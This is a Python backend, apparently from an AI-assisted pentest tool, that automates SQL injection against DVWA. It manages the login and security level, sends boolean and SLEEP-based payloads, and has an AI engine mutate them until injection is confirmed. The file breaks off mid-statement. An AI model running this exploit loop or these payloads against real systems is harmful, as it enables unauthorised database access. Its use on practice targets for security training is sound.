# backends/web_backend.py
from __future__ import annotations

import os
import re
import time
import hashlib
from typing import Any, Dict, Optional
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode, unquote_plus

import requests

from core.models import Observation, PatchPlan, PatchAction
from ai_engine.poc_ai import analyze_poc


def _sha16(s: str) -> str:
    return hashlib.sha256(s.encode(errors="ignore")).hexdigest()[:16]


def _extract_user_token(html: str) -> Optional[str]:
    m = re.search(
        r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else None


def _extract_security_level(html: str) -> Optional[str]:
    # DVWA shows: Security Level is currently <em>low</em>
    m = re.search(
        r"Security Level is currently\s*<em>\s*([a-zA-Z]+)\s*</em>", html, re.I)
    if m:
        return m.group(1).strip().lower()

    # fallback variant: <b>Security Level:</b> low
    m = re.search(r"Security Level:\s*</b>\s*([a-zA-Z]+)", html, re.I)
    if m:
        return m.group(1).strip().lower()

    return None


def _looks_like_login(html: str) -> bool:
    if "DVWA - Login" in html:
        return True
    if "Login failed" in html:
        return True
    if 'action="login.php"' in html and 'name="username"' in html:
        return True
    return False


def _looks_authenticated(html: str) -> bool:
    return ("logout.php" in html) or ("Logout" in html)


def _extract_sqli_signal(html: str) -> str:
    """
    Extract only the meaningful SQLi result area so fingerprints
    are not affected by unrelated page changes.
    """
    if not html:
        return ""

    markers = [
        "First name:",
        "Surname:",
        "ID:",
        "User ID exists in the database.",
        "MISSING",
    ]

    found = []
    for m in markers:
        if m in html:
            found.append(m)

    compact = re.sub(r"\s+", " ", html)
    return " | ".join(found) + " || " + compact[:300]


def _update_query_param_in_path(path: str, param: str, new_value: str) -> str:
    """
    path example:
      /vulnerabilities/sqli/?id=1&Submit=Submit
    returns same path with id replaced.
    """
    parts = urlsplit(path)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = new_value
    new_query = urlencode(q, doseq=True)
    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


class WebBackend:
    name = "web"

    def __init__(self, spec: Dict[str, Any], run_id: str, timeout: int = 20):
        self.spec = spec
        self.base_url: str = spec["base_url"].rstrip("/")
        self.timeout = int(spec.get("timeout", timeout))
        self.run_id = run_id

        os.makedirs("logs", exist_ok=True)
        self.raw_log_path = f"logs/web_obs_{run_id}.txt"

        self.session = requests.Session()

    def _get_step_query_param(self, step_id: str, param: str = "id") -> Optional[str]:
        for s in self.spec.get("steps", []):
            if s.get("id") == step_id:
                path = s.get("path") or ""
                parts = urlsplit(path)
                q = dict(parse_qsl(parts.query, keep_blank_values=True))
                return q.get(param)
        return None

    def _get_payload_from_path(self, path: str, param: str = "id") -> Optional[str]:
        if not path:
            return None
        parts = urlsplit(path)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        return q.get(param)

    def _is_false_probe_payload(self, payload: Optional[str]) -> bool:
        if not payload:
            return False

        p = unquote_plus(str(payload)).strip()

        false_patterns = [
            r"\bAND\s+1\s*=\s*2\b",
            r"\bOR\s+1\s*=\s*2\b",
            r"\bAND\s+FALSE\b",
            r"\bOR\s+FALSE\b",
        ]
        return any(re.search(x, p, flags=re.I) for x in false_patterns)

    def _to_true_payload(self, payload: Optional[str]) -> str:
        p = unquote_plus(str(payload or "")).strip()

        if not p:
            return "1 OR 1=1"

        # convert classic false probes into true probes
        p2 = re.sub(r"\bAND\s+1\s*=\s*2\b", "AND 1=1", p, flags=re.I)
        p2 = re.sub(r"\bOR\s+1\s*=\s*2\b", "OR 1=1", p2, flags=re.I)
        p2 = re.sub(r"\bAND\s+FALSE\b", "AND TRUE", p2, flags=re.I)
        p2 = re.sub(r"\bOR\s+FALSE\b", "OR TRUE", p2, flags=re.I)

        if p2 != p:
            return p2

        # fallback canonical exploits
        if "'" in p:
            return "1' AND 1=1 -- -"

        return "1 OR 1=1"

    def _has_balanced_single_quotes(self, s: str) -> bool:
        return s.count("'") % 2 == 0

    def _has_balanced_parentheses(self, s: str) -> bool:
        depth = 0
        for ch in s:
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth < 0:
                    return False
        return depth == 0

    def _candidate_is_usable(self, payload: Optional[str]) -> bool:
        if not payload:
            return False

        p = unquote_plus(str(payload)).strip()
        if not p:
            return False

        if self._is_false_probe_payload(p):
            return False

        broken_patterns = [
            r"^\s*'$",
            r'^\s*"$',
            r"\bAND\s*$",
            r"\bOR\s*$",
            r"^\s*49014k\s*$",
            r"\bOR\s*=\s*\d+",
            r"\bAND\s*=\s*\d+",
            r"\bOR\s*=\s*'[^']*'",
            r"\bAND\s*=\s*'[^']*'",
        ]
        if any(re.search(x, p, flags=re.I) for x in broken_patterns):
            return False

        has_comment = "--" in p or "#" in p

        if not has_comment and not self._has_balanced_single_quotes(p):
            return False

        if not self._has_balanced_parentheses(p):
            return False

        if p.endswith("-") and "--" not in p:
            return False

        if "if(" in p.lower():
            if not re.search(
                r"if\s*\(\s*\d+\s*=\s*\d+\s*,\s*sleep\s*\(\s*\d+\s*\)\s*,\s*0\s*\)",
                p,
                flags=re.I,
            ):
                return False

        usable_patterns = [
            r"\bOR\s+1\s*=\s*1\b",
            r"\bAND\s+1\s*=\s*1\b",
            r"\bSLEEP\s*\(\s*\d+\s*\)",
            r"'\s*OR\s*'1'\s*=\s*'1",
            r"'\s*AND\s+1\s*=\s*1",
            r"\bIF\s*\(",
        ]
        if any(re.search(x, p, flags=re.I) for x in usable_patterns):
            return True

        if re.search(r"\b\d+\s+(AND|OR)\s+\d+\s*=\s*\d+\b", p, flags=re.I):
            return True

        return False
    def _normalize_payload(self, payload: Optional[str]) -> str:
        p = unquote_plus(str(payload or ""))
        p = re.sub(r"\s+", " ", p).strip()
        p = re.sub(r"--\s+", "-- ", p)
        return p

    def _detect_payload_intent(self, payload: str) -> str:
        p = payload.lower()

        if "sleep(" in p or "benchmark(" in p:
            return "time_based"

        if "union" in p and "select" in p:
            return "union_based"

        if re.search(r"\b(and|or)\b", p) and re.search(r"(=|!=|<>|<|>)", p):
            return "boolean_based"

        return "unknown"

    def _detect_damage_types(self, payload: str) -> list[str]:
        p = payload or ""
        lower = p.lower()
        damage = []

        if not p.strip():
            damage.append("empty_payload")

        if p.count("'") % 2 != 0:
            damage.append("unbalanced_single_quote")

        depth = 0
        balanced_parens = True
        for ch in p:
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth < 0:
                    balanced_parens = False
                    break

        if depth != 0:
            balanced_parens = False

        if not balanced_parens:
            damage.append("unbalanced_parenthesis")

        if re.search(r"\b(and|or)\s*$", lower):
            damage.append("dangling_boolean_operator")

        if lower.endswith("-") and "--" not in lower:
            damage.append("incomplete_comment")

        if "sleep(" in lower and not self._has_balanced_parentheses(p):
            damage.append("broken_time_syntax")

        # NEW: IF syntax issues
        if "if(" in lower:
            if not re.search(r"if\s*\(\s*\d+\s*=\s*\d+\s*,\s*sleep\s*\(\s*\d+\s*\)", lower):
                damage.append("broken_if_time_syntax")

        if re.search(r"if\s*\(\s*\d+\s*=\s*\d+\s*sleep\s*\(", lower):
            damage.append("missing_if_comma")

        if lower.count("(") > lower.count(")"):
            if "sleep(" in lower or "if(" in lower:
                damage.append("broken_function_parenthesis")

        if not damage:
            damage.append("unknown")

        return damage

    def _prefer_same_intent_repair(self, original_payload: Optional[str], repaired_payload: Optional[str]) -> bool:
        original_norm = self._normalize_payload(original_payload)
        repaired_norm = self._normalize_payload(repaired_payload)

        original_intent = self._detect_payload_intent(original_norm)
        repaired_intent = self._detect_payload_intent(repaired_norm)

        if original_intent == "time_based":
            return repaired_intent == "time_based"

        return True
      
    def _pick_best_candidate(self, analysis: Dict[str, Any], current_payload: Optional[str]) -> str:
        """
        Prefer the AI-ranked candidate_scores list first.
        Return the highest-scored usable candidate.
        Only fall back to next_payload, then current_payload.
        """
        cur_norm = self._normalize_payload(current_payload)

        candidate_scores = analysis.get("candidate_scores") or []
        ranked: list[tuple[float, str]] = []

        if isinstance(candidate_scores, list):
            for item in candidate_scores:
                if not isinstance(item, dict):
                    continue

                payload = str(item.get("payload", "")).strip()
                if not payload:
                    continue

                try:
                    score = float(item.get("score", 0.0))
                except Exception:
                    score = 0.0

                ranked.append((score, payload))

        ranked.sort(key=lambda x: x[0], reverse=True)
        seen = set()

        for _, payload in ranked:
            norm = self._normalize_payload(payload)
            if norm == cur_norm:
                continue
            if norm in seen:
                continue
            seen.add(norm)

            if self._candidate_is_usable(payload):
                return payload

        candidates = analysis.get("candidates") or []
        if isinstance(candidates, list):
            for c in candidates:
                c = str(c or "").strip()
                if not c:
                    continue

                norm = self._normalize_payload(c)
                if norm == cur_norm:
                    continue
                if norm in seen:
                    continue
                seen.add(norm)

                if self._candidate_is_usable(c):
                    return c

        next_payload = str(analysis.get("next_payload", "")).strip()
        if next_payload and self._candidate_is_usable(next_payload):
            return next_payload

        return current_payload or ""
    def _build_payload_features(self, payload: Optional[str]) -> Dict[str, Any]:
        raw = str(payload or "")
        norm = self._normalize_payload(raw)
        lower = norm.lower()

        return {
            "length": len(norm),
            "token_count": len(norm.split()) if norm else 0,
            "single_quote_count": norm.count("'"),
            "double_quote_count": norm.count('"'),
            "single_quotes_balanced": self._has_balanced_single_quotes(norm),
            "parentheses_open": norm.count("("),
            "parentheses_close": norm.count(")"),
            "parentheses_balanced": self._has_balanced_parentheses(norm),
            "contains_comment": ("--" in norm or "#" in norm),
            "comment_style": "--" if "--" in norm else ("#" if "#" in norm else None),
            "contains_and": bool(re.search(r"\band\b", lower)),
            "contains_or": bool(re.search(r"\bor\b", lower)),
            "contains_sleep": "sleep(" in lower,
            "contains_if": "if(" in lower,
            "contains_union": "union" in lower,
            "contains_select": "select" in lower,
            "contains_comparison": bool(re.search(r"(=|!=|<>|<|>)", norm)),
            "likely_intent": self._detect_payload_intent(norm),
            "likely_damage_types": self._detect_damage_types(norm),
            "obvious_truncation": bool(
                re.search(r"\b(and|or)\s*$", lower)
                or lower.endswith("'")
                or lower.endswith('"')
                or lower.endswith("(")
                or (lower.endswith("-") and "--" not in lower)
            ),
        }

    def _classify_attempt_result(self, web: Dict[str, Any]) -> str:
        failure_type = web.get("failure_type")
        elapsed = float(web.get("elapsed_s") or 0.0)
        baseline_elapsed = float((web.get("baseline_elapsed_s") or 0.0))

        if failure_type == "time_probe_success":
            return "timing_success"

        if failure_type == "boolean_no_difference":
            return "no_boolean_difference"

        if failure_type == "candidate_not_confirmed":
            return "candidate_not_confirmed"

        if failure_type == "session_lost":
            return "session_lost"

        if web.get("error"):
            return "error"

        if baseline_elapsed > 0 and (elapsed - baseline_elapsed) >= 3.0:
            return "timing_signal"

        if web.get("response_fp") != web.get("baseline_fp"):
            return "response_changed"

        return "no_effect"

    def _build_run_summary(self, state: Dict[str, Any]) -> Dict[str, Any]:
        attempts = state.get("attempt_history", [])
        payloads = [self._normalize_payload(a.get("payload")) for a in attempts if a.get("payload")]

        intents = []
        for p in payloads:
            intent = self._detect_payload_intent(p)
            intents.append(intent)

        return {
            "attempt_count": len(attempts),
            "distinct_payload_count": len(set(payloads)),
            "duplicate_attempt_detected": len(payloads) != len(set(payloads)),
            "time_payloads_tried": sum(1 for x in intents if x == "time_based"),
            "boolean_payloads_tried": sum(1 for x in intents if x == "boolean_based"),
            "union_payloads_tried": sum(1 for x in intents if x == "union_based"),
            "latest_failure_type": state.get("last_failure_type"),
            "run_is_stuck": len(payloads) >= 3 and len(set(payloads[-3:])) == 1,
        }

    def _build_attempt_entry(self, state: Dict[str, Any], web: Dict[str, Any]) -> Dict[str, Any]:
        payload = self._get_payload_from_path(web.get("path", ""))
        normalized_payload = self._normalize_payload(payload)
        likely_result = self._classify_attempt_result(web)

        likely_failure_reason = None
        if likely_result in ("no_effect", "candidate_not_confirmed"):
            likely_failure_reason = "payload likely ineffective or structurally broken"
        elif likely_result == "no_boolean_difference":
            likely_failure_reason = "boolean probe did not create a meaningful distinction"
        elif likely_result == "session_lost":
            likely_failure_reason = "authentication/session was lost"

        return {
            "step_id": web.get("step_id"),
            "payload": payload,
            "normalized_payload": normalized_payload,
            "status": web.get("status"),
            "authenticated": web.get("auth_state") == "authenticated",
            "response_fp": web.get("response_fp"),
            "baseline_fp": web.get("baseline_fp"),
            "true_fp": web.get("true_fp"),
            "false_fp": web.get("false_fp"),
            "response_changed": web.get("response_fp") != web.get("baseline_fp"),
            "error_detected": bool(web.get("error")),
            "elapsed_s": web.get("elapsed_s"),
            "failure_type": web.get("failure_type"),
            "likely_result": likely_result,
            "likely_failure_reason": likely_failure_reason,
        }

    def _build_ai_observation(
        self,
        state: Dict[str, Any],
        web: Dict[str, Any],
        allowed_strategies: list[str],
    ) -> Dict[str, Any]:
        cli = self.spec.get("adexa_cli") or {}
        param = cli.get("param", "id")
        candidate_step = cli.get("candidate_step", "sqli_candidate")

        candidate_payload = self._get_step_query_param(candidate_step, param)
        current_payload = (
            candidate_payload
            or cli.get("starting_payload")
            or self._get_payload_from_path(web.get("path", ""), param)
        )

        normalized_payload = self._normalize_payload(current_payload)
        payload_features = self._build_payload_features(current_payload)

        state.setdefault("attempt_history", [])
        state["attempt_history"].append(self._build_attempt_entry(state, web))
        state["attempt_history"] = state["attempt_history"][-8:]

        baseline_elapsed_s = 0.0
        success = self.spec.get("success") or {}
        bd = success.get("boolean_diff") or {}
        base_step = bd.get("baseline_step")
        if base_step:
            baseline_elapsed_s = float((state.get("step_elapsed") or {}).get(base_step, 0.0) or 0.0)

        timing_delta_s = float(web.get("elapsed_s") or 0.0) - baseline_elapsed_s

        return {
            "target": {
                "name": "DVWA SQL Injection",
                "goal": "find a verified SQL injection payload",
                "endpoint_path": urlsplit(web.get("path", "")).path,
                "parameter": param,
                "method": web.get("method"),
                "mode": "web",
                "auth_state": web.get("auth_state"),
                "security_level": state.get("dvwa_security_level"),
            },
            "payload": {
                "current_payload_raw": current_payload,
                "current_payload_decoded": unquote_plus(str(current_payload or "")),
                "current_payload_normalized": normalized_payload,
                "candidate_source": candidate_step,
                "looks_numeric_context": "'" not in normalized_payload,
                "looks_quoted_context": "'" in normalized_payload,
            },
            "payload_features": payload_features,
            "response_features": {
                "status_code": web.get("status"),
                "elapsed_s": web.get("elapsed_s"),
                "baseline_elapsed_s": baseline_elapsed_s,
                "timing_delta_s": timing_delta_s,
                "response_fp": web.get("response_fp"),
                "baseline_fp": web.get("baseline_fp"),
                "true_fp": web.get("true_fp"),
                "false_fp": web.get("false_fp"),
                "matches_baseline": web.get("response_fp") == web.get("baseline_fp"),
                "matches_true_probe": web.get("response_fp") == web.get("true_fp"),
                "matches_false_probe": web.get("response_fp") == web.get("false_fp"),
                "response_changed": web.get("response_fp") != web.get("baseline_fp"),
                "error_detected": bool(web.get("error")),
                "failure_type": web.get("failure_type"),
                "auth_state": web.get("auth_state"),
                "response_signal_summary": web.get("response_snippet", "")[:160],
            },
            "attempt_history": state.get("attempt_history", []),
            "run_summary": self._build_run_summary(state),
            "memory_context": [],
            "constraints": {
                "allowed_strategies": allowed_strategies,
                "max_candidates": 3,
                "preserve_payload_style": True,
                "do_not_repeat_failed_payloads": True,
            },
        }

        
    def _ai_output_is_consistent(
        self,
        current_payload: Optional[str],
        next_strategy: str,
        next_payload: str,
        explanation: str,
    ) -> bool:
        cur = (current_payload or "").strip().lower()
        p = (next_payload or "").strip().lower()
        exp = (explanation or "").strip().lower()

        if not p:
            return False

        bad_patterns = [
            "1=true",
            "1=false",
            "or true",
            "and true--",
            "and false--",
        ]
        if any(x in p for x in bad_patterns):
            return False

        if ("time" in exp or "sleep" in exp) and "sleep(" not in p:
            return False

        numeric_input = "'" not in cur

        if next_strategy == "SWITCH_BOOLEAN" and numeric_input and "'" in p:
            return False

        if next_strategy == "CHANGE_QUOTES" and "'" not in p:
            return False

        return True
    def _safe_fallback_decision(self, current_payload: Optional[str]) -> Dict[str, str]:
        cur = (current_payload or "").strip()

        if "sleep" in cur.lower():
            return {
                "next_strategy": "SWITCH_TIME",
                "next_payload": self._to_true_payload(cur),
                "explanation": "Fallback decision used because AI output was inconsistent.",
            }

        if "'" in cur:
            return {
                "next_strategy": "CHANGE_QUOTES",
                "next_payload": self._to_true_payload(cur),
                "explanation": "Fallback decision used because AI output was inconsistent.",
            }

        return {
            "next_strategy": "SWITCH_BOOLEAN",
            "next_payload": self._to_true_payload(cur),
            "explanation": "Fallback decision used because AI output was inconsistent.",
        }

    def finalize_success(self, state: Dict[str, Any], obs: Observation) -> Dict[str, Any]:
        """
        Called only after SQLi has already been verified.

        Goal:
        - keep the best successful payload
        - avoid saving false probes as final exploits
        - preserve already valid working payloads
        """
        web = (obs.extra or {}).get("web") or {}
        success = self.spec.get("success") or {}
        bd = success.get("boolean_diff") or {}

        cli = self.spec.get("adexa_cli") or {}
        param = cli.get("param", "id")

        current_step = web.get("step_id")
        true_step = bd.get("true_step")
        false_step = bd.get("false_step")
        candidate_step = cli.get("candidate_step", "sqli_candidate")

        true_payload = self._get_step_query_param(true_step, param) if true_step else None
        candidate_payload = self._get_step_query_param(candidate_step, param)
        current_payload = self._get_step_query_param(current_step, param) if current_step else None
        repaired_payload = state.get("verified_exploit_payload")

        def clean(p: Optional[str]) -> Optional[str]:
            if not p:
                return None
            return unquote_plus(str(p)).strip()

        repaired_payload = clean(repaired_payload)
        current_payload = clean(current_payload)
        candidate_payload = clean(candidate_payload)
        true_payload = clean(true_payload)

        if self._candidate_is_usable(current_payload):
            state["verified"] = True
            state["verified_exploit_payload"] = current_payload
            state["final_payload"] = current_payload
            state["final_payload_source"] = "current_step"
            if state.get("strategy_used") not in ("KEEP_CANDIDATE", "KEEP_REPAIRED"):
                state["strategy_used"] = "KEEP_CURRENT"
            return state

        if self._candidate_is_usable(repaired_payload) and self._prefer_same_intent_repair(candidate_payload, repaired_payload):
            state["verified"] = True
            state["verified_exploit_payload"] = repaired_payload
            state["final_payload"] = repaired_payload
            state["final_payload_source"] = "repaired_payload"
            if state.get("strategy_used") not in ("KEEP_CANDIDATE", "KEEP_CURRENT"):
                state["strategy_used"] = "KEEP_REPAIRED"
            return state

        if self._candidate_is_usable(candidate_payload):
            state["verified"] = True
            state["verified_exploit_payload"] = candidate_payload
            state["final_payload"] = candidate_payload
            state["final_payload_source"] = "candidate_step"
            state["strategy_used"] = "KEEP_CANDIDATE"
            return state

        if current_step == false_step and self._candidate_is_usable(true_payload):
            state["verified"] = True
            state["verified_exploit_payload"] = true_payload
            state["final_payload"] = true_payload
            state["final_payload_source"] = "true_step"
            state["strategy_used"] = "BOOLEAN_VERIFIED"
            return state

        if self._candidate_is_usable(true_payload):
            state["verified"] = True
            state["verified_exploit_payload"] = true_payload
            state["final_payload"] = true_payload
            state["final_payload_source"] = "true_step"
            state["strategy_used"] = "BOOLEAN_VERIFIED"
            return state

        fallback = self._to_true_payload(
            current_payload or repaired_payload or candidate_payload or true_payload
        )
        state["verified"] = True
        state["verified_exploit_payload"] = fallback
        state["final_payload"] = fallback
        state["final_payload_source"] = "fallback"
        state["strategy_used"] = "BOOLEAN_FALLBACK"
        return state

    # ---------------------------
    # Core loop interface
    # ---------------------------

    def observe(self, state: Dict[str, Any]) -> Observation:
        state.setdefault("step_index", 0)
        state.setdefault("response_fingerprints", {})
        state.setdefault("step_elapsed", {})
        state.setdefault("cookie_jar", {})
        state.setdefault("dvwa_security_level", None)
        state.setdefault("dvwa_user_token", None)
        state.setdefault("last_step_id", None)

        steps = self.spec.get("steps", [])
        idx = int(state["step_index"])

        if idx >= len(steps):
            state["last_failure_type"] = "no_more_steps"
            return Observation(
                mode="web",
                raw_log_path=self.raw_log_path,
                extra={
                    "web": {
                        "error": "no_more_steps",
                        "failure_type": "no_more_steps",
                        "step_index": idx,
                        "total_steps": len(steps),
                    }
                },
            )

        step = steps[idx]
        step_id = step.get("id", f"step_{idx}")
        step_name = step.get("name", step_id)

        method = (step.get("method") or "GET").upper()
        path = step.get("path") or "/"
        url = self.base_url + path

        headers = step.get("headers") or {}
        body = step.get("body")

        user_token = state.get("user_token") or state.get("dvwa_user_token") or ""
        if isinstance(body, str):
            body = body.replace("{{user_token}}", user_token)

        for k, v in (state.get("cookie_jar") or {}).items():
            self.session.cookies.set(k, v)

        t0 = time.time()
        err = None
        status = None
        text = ""
        resp_headers = {}

        try:
            if method == "GET":
                r = self.session.get(url, headers=headers, timeout=self.timeout, allow_redirects=True)
            else:
                r = self.session.request(
                    method,
                    url,
                    headers=headers,
                    data=body,
                    timeout=self.timeout,
                    allow_redirects=True,
                )

            status = r.status_code
            text = r.text or ""
            resp_headers = {k.lower(): v for k, v in (r.headers or {}).items()}

        except Exception as e:
            err = str(e)

        elapsed = time.time() - t0

        cookie_jar = requests.utils.dict_from_cookiejar(self.session.cookies)
        state["cookie_jar"] = cookie_jar

        tok = _extract_user_token(text) if text else None
        if tok:
            state["dvwa_user_token"] = tok
            state["user_token"] = tok

        sec = _extract_security_level(text) if text else None
        if sec:
            state["dvwa_security_level"] = sec

        if text and _looks_like_login(text):
            auth_state = "not_authenticated"
        elif text and _looks_authenticated(text):
            auth_state = "authenticated"
        else:
            auth_state = "authenticated" if "PHPSESSID" in cookie_jar else "not_authenticated"

        signal_text = text
        if step_id in ("sqli_baseline", "sqli_true", "sqli_false", "sqli_probe", "sqli_candidate"):
            signal_text = _extract_sqli_signal(text)

        fp = _sha16(signal_text)
        state["response_fingerprints"][step_id] = fp
        state.setdefault("debug_fps", {})
        state["debug_fps"][step_id] = fp
        state["step_elapsed"][step_id] = elapsed
        state["last_step_id"] = step_id

        failure_type = "ok_or_unknown"
        if err:
            failure_type = "error"
        else:
            if step_id == "login" and text and "Login failed" in text:
                failure_type = "login_failed"

            if auth_state == "not_authenticated" and step_id not in ("get_login", "login"):
                failure_type = "session_lost"

            required = (self.spec.get("success") or {}).get("require_security_level")
            if required and auth_state == "authenticated":
                cur = state.get("dvwa_security_level")
                if cur and cur.lower() != str(required).lower() and step_id in ("get_security", "security_check"):
                    failure_type = "security_not_required_level"

            bd = (self.spec.get("success") or {}).get("boolean_diff") or {}
            base_step = bd.get("baseline_step")
            true_step = bd.get("true_step")
            false_step = bd.get("false_step")

            if base_step and true_step and false_step and step_id == false_step:
                fps = state.get("response_fingerprints") or {}
                base_fp = fps.get(base_step)
                true_fp = fps.get(true_step)
                false_fp = fps.get(false_step)

                if base_fp and true_fp and false_fp:
                    if false_fp == base_fp:
                        failure_type = "boolean_no_difference"
                    elif true_fp != base_fp:
                        failure_type = "candidate_not_confirmed"

            if state.get("time_probe_active") and step_id == state.get("time_probe_step_id"):
                base_id = state.get("time_probe_baseline_step")
                base_elapsed = (state.get("step_elapsed") or {}).get(base_id, 0.0) if base_id else 0.0
                sleep_s = float(state.get("time_probe_sleep", 0))
                delta = elapsed - float(base_elapsed or 0.0)
                if sleep_s > 0 and delta >= max(1.5, sleep_s - 1.2):
                    failure_type = "time_probe_success"

        state["last_failure_type"] = failure_type

        self._append_log(
            step_id,
            step_name,
            method,
            url,
            status,
            elapsed,
            err,
            auth_state,
            cookie_jar,
            state.get("dvwa_user_token"),
            state.get("dvwa_security_level"),
            failure_type,
            text,
        )

        return Observation(
            mode="web",
            raw_log_path=self.raw_log_path,
            extra={
                "web": {
                    "step_id": step_id,
                    "step_name": step_name,
                    "method": method,
                    "path": path,
                    "url": url,
                    "status": status,
                    "elapsed_s": elapsed,
                    "error": err,
                    "auth_state": auth_state,
                    "cookie_jar": cookie_jar,
                    "dvwa_user_token": state.get("dvwa_user_token"),
                    "dvwa_security_level": state.get("dvwa_security_level"),
                    "failure_type": failure_type,
                    "response_fp": fp,
                    "baseline_fp": state["response_fingerprints"].get(
                        ((self.spec.get("success") or {}).get("boolean_diff") or {}).get("baseline_step")
                    ),
                    "true_fp": state["response_fingerprints"].get(
                        ((self.spec.get("success") or {}).get("boolean_diff") or {}).get("true_step")
                    ),
                    "false_fp": state["response_fingerprints"].get(
                        ((self.spec.get("success") or {}).get("boolean_diff") or {}).get("false_step")
                    ),
                    "response_headers_subset": {
                        "set-cookie": resp_headers.get("set-cookie"),
                        "location": resp_headers.get("location"),
                        "content-type": resp_headers.get("content-type"),
                    },
                    "response_snippet": (text[:900] if text else ""),
                }
            },
        )

    def is_success(self, state: Dict[str, Any], obs: Observation) -> bool:
        success = self.spec.get("success") or {}

        required = success.get("require_security_level")
        if required:
            cur = (state.get("dvwa_security_level") or "").lower()
            if cur != str(required).lower():
                return False

        bd = success.get("boolean_diff") or {}
        base = bd.get("baseline_step")
        t = bd.get("true_step")
        f = bd.get("false_step")

        verified_boolean = False
        if base and t and f:
            fps = state.get("response_fingerprints") or {}
            bfp = fps.get(base)
            tfp = fps.get(t)
            ffp = fps.get(f)
            if bfp and tfp and ffp:
                if (tfp == bfp) and (ffp != bfp):
                    verified_boolean = True

        td = success.get("time_diff") or {}
        base = td.get("baseline_step")
        probe = td.get("probe_step")
        min_delta = float(td.get("min_delta_s", 3.0))
        verified_time = False
        if base and probe:
            elapsed = state.get("step_elapsed") or {}
            b = float(elapsed.get(base, 0.0) or 0.0)
            p = float(elapsed.get(probe, 0.0) or 0.0)
            if b > 0 and p > 0 and (p - b) >= min_delta:
                confirmations = int(state.get("time_probe_confirmations", 0))
                if not state.get("time_probe_active") or confirmations >= 1:
                    verified_time = True

        web = (obs.extra or {}).get("web") or {}
        if web.get("failure_type") == "time_probe_success":
            # A single slow request may be caused by server/network jitter.
            # Require one previous successful timing observation before
            # accepting the current timing result as verified.
            confirmations = int(state.get("time_probe_confirmations", 0))
            if not state.get("time_probe_active") or confirmations >= 1:
                verified_time = True

        verified = verified_boolean or verified_time
        if not verified:
            return False

        # NEW: do not allow success if candidate still looks bad
        cli = self.spec.get("adexa_cli") or {}
        param = cli.get("param", "id")
        candidate_step = cli.get("candidate_step", "sqli_candidate")
        candidate_payload = self._get_step_query_param(candidate_step, param)

        if not self._candidate_is_usable(candidate_payload):
            return False

        return True


    def ai_plan(self, obs: Observation, state: Dict[str, Any]) -> Optional[PatchPlan]:
        """
        AI planner:
        - deterministic for session/security handling
        - AI chooses exploit mutation strategy for SQLi failures
        - supports multi-candidate AI output
        """
        web = (obs.extra or {}).get("web") or {}
        failure = web.get("failure_type")
        step_id = web.get("step_id")

        if failure in ("no_more_steps", None):
            state["strategy_used"] = "STOP_NO_MORE_STEPS"
            return None

        if failure == "session_lost":
            state["strategy_used"] = "FIX_SESSION"
            return PatchPlan(
                root_cause="session_lost",
                confidence=0.95,
                actions=[PatchAction(type="goto_step_id", value="get_login")],
                explanation="session_lost → jump to get_login to rebuild session",
            )

        if failure == "login_failed":
            state["strategy_used"] = "BAD_CREDS"
            return None

        if failure == "security_not_required_level":
            state["strategy_used"] = "SET_SECURITY_LOW"
            return PatchPlan(
                root_cause="security_not_required_level",
                confidence=0.90,
                actions=[PatchAction(type="goto_step_id", value="set_security_low")],
                explanation="security not low → jump to set_security_low",
            )

        if step_id == "sqli_false":
            cli = self.spec.get("adexa_cli") or {}
            candidate_step = cli.get("candidate_step", "sqli_candidate")
            param = cli.get("param", "id")
            candidate_payload = self._get_step_query_param(candidate_step, param)

            if not self._candidate_is_usable(candidate_payload):
                observation = self._build_ai_observation(
                    state,
                    web,
                    allowed_strategies=["CHANGE_QUOTES", "SWITCH_BOOLEAN", "SWITCH_TIME"],
                )

                ai_result = analyze_poc(observation)
                analysis = (ai_result or {}).get("analysis", {})

                next_strategy = analysis.get("next_strategy", "SWITCH_BOOLEAN")
                next_payload = str(analysis.get("next_payload") or candidate_payload or "").strip()
                candidates = analysis.get("candidates") or ([next_payload] if next_payload else [])
                explanation = analysis.get("explanation") or "AI repaired invalid candidate."
                confidence = float(analysis.get("confidence", 0.6) or 0.6)

                if next_strategy not in ("CHANGE_QUOTES", "SWITCH_BOOLEAN", "SWITCH_TIME"):
                    next_strategy = "SWITCH_BOOLEAN"

                state["strategy_used"] = next_strategy
                state["verified_exploit_payload"] = next_payload
                state["ai_reason"] = explanation or "AI repair selected"
                state["used_memory_case"] = analysis.get("used_memory_case")
                state["memory_match_reason"] = analysis.get("memory_match_reason")

                return PatchPlan(
                    root_cause="bad_candidate_payload",
                    confidence=confidence,
                    actions=[
                        PatchAction(
                            type="mutate_step_query_param",
                            value={
                                "step_id": candidate_step,
                                "param": param,
                                "new_value": next_payload,
                            },
                        ),
                        PatchAction(type="goto_step_id", value=candidate_step),
                    ],
                    explanation=f"AI repaired bad candidate using {next_strategy}: {explanation}",
                    metadata={
                        "candidates": candidates,
                        "current_payload": candidate_payload,
                        "target_step_id": candidate_step,
                        "target_param": param,
                        "strategy": next_strategy,
                    },
                )

        if failure == "candidate_not_confirmed":
            cli = self.spec.get("adexa_cli") or {}
            candidate_step = cli.get("candidate_step", "sqli_candidate")
            param = cli.get("param", "id")

            observation = self._build_ai_observation(
                state,
                web,
                allowed_strategies=["CHANGE_QUOTES", "SWITCH_BOOLEAN", "SWITCH_TIME"],
            )

            ai_result = analyze_poc(observation)
            analysis = (ai_result or {}).get("analysis", {})

            next_strategy = analysis.get("next_strategy", "SWITCH_BOOLEAN")
            current_payload = self._get_step_query_param(candidate_step, param)
            next_payload = str(analysis.get("next_payload") or current_payload or "").strip()
            candidates = analysis.get("candidates") or ([next_payload] if next_payload else [])
            explanation = analysis.get("explanation") or "AI chose next payload."
            confidence = float(analysis.get("confidence", 0.6) or 0.6)

            if next_strategy not in ("CHANGE_QUOTES", "SWITCH_BOOLEAN", "SWITCH_TIME"):
                next_strategy = "SWITCH_BOOLEAN"

            state["strategy_used"] = next_strategy
            state["verified_exploit_payload"] = next_payload
            state["ai_reason"] = explanation or "AI repair selected"
            state["used_memory_case"] = analysis.get("used_memory_case")
            state["memory_match_reason"] = analysis.get("memory_match_reason")

            return PatchPlan(
